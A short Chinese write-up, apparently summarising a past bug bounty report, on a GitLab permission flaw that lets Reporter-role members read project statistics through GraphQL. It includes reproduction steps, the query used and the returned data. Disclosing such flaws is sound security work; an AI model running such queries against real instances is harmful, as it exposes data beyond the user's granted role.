背景

今天这个漏洞是jimeno小哥发现并于去年2月份提交的,gitlab的GraphQL项目统计属性可由Reporter项目成员访问，但是gitlab的官方文档指定的“查看项目统计信息”的权限仅供开发人员及以上成员访问。

复现步骤

1.使用userA(受害者)创建一个新的Public项目。

2.添加一个Wiki页面，随机提交一些数据，这样统计数据就不会返回为0。

3.进入Members并邀请userB(攻击者)用户作为Reporter角色。

4.对于攻击者用户，跳转至GitLab GraphQL接口处。

5.运行如下的查询，将项目的路径替换为你自己的:

query h1test {  
  project(fullPath: "naaytesting2/foobarbazz") {  
    id  
    statistics {  
      snippetsSize  
      wikiSize  
      commitCount  
      lfsObjectsSize  
    }  
  }  
}

6.通知项目统计数据返回给Reporter成员。

{  
  "data": {  
    "project": {  
      "id": "gid://gitlab/Project/24629076",  
      "statistics": {  
        "snippetsSize": 136314,  
        "wikiSize": 199229,  
        "commitCount": 1,  
        "lfsObjectsSize": 0  
      }  
    }  
  }  
}
